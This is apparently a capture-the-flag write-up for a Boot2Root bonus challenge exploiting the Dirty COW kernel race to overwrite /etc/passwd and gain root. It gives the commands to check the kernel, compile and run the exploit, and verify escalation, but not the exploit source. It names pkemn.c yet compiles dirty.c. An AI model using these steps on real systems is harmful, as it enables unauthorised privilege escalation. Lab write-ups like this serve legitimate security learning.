# Boot2Root - Bonus Challenge 5: Linux Kernel Vulnerability

## 1. Challenge Overview
**Challenge:** Linux Kernel Vulnerability — `pkemn.c` (Dirty COW / COW race)

---

## 2. Summary
- Exploits a **race condition** in the Linux kernel **copy‑on‑write (COW)**.
- Allows an **unprivileged user to write to read‑only memory mappings**.
- Can **modify protected files** (e.g. `/etc/passwd`) and **escalate to root**.
- Local privilege escalation on many **older Linux kernels** (a.k.a. *Dirty COW*).

---

## 3. Steps

### 3.1 Check kernel (likely vulnerable if old)
```bash
uname -a
cat /proc/version
```

### 3.2 Get & compile the exploit
```bash
# assuming pkemn.c is in the current dir
gcc -pthread dirty.c -o dirty -lcrypt
```

### 3.3 Run exploit
```bash
./dirty
```

### 3.4 Verify escalation
```bash
id
whoami
```

### 3.5 (Optional) Restore backup
```bash
[ -f /tmp/passwd.bak ] && sudo cp /tmp/passwd.bak /etc/passwd
```

---

## 4. Result
**Root access obtained** ✅
